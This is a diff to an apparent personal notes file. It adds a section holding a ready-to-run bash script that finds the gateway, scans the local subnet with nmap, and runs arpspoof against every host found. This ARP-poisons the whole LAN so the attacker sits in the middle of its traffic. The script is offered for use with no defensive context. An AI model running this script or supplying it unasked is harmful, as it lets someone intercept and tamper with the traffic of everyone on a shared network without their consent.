@@ -151,3 +151,36 @@ sudo systemctl enable xrdp
 sudo reboot
 ```
 
+
+
+## arpspoof
+
+```sh
+#!/bin/bash
+#auther i
+set -x
+gateway=`route -n|grep "0.0.0.0"|head -1|awk '{print $2}'`
+echo gateway is $gateway
+network=${gateway%.*}.0
+if [ -z "$gateway" ]; then
+	echo "please set the gateway ip "
+	exit
+fi
+function echome(){
+	ip=$1
+	if [ "$ip" != "$gateway" ]; then
+		echo "to spoof "$ip
+		arpspoof -t $ip -r $gateway
+	fi
+}
+
+function ips(){
+	ips=`nmap -sP $network/24|grep report|awk {'print $5'}`
+	echo $ips
+}
+for i in `ips`
+do 
+echome $i &
+done
+```
+
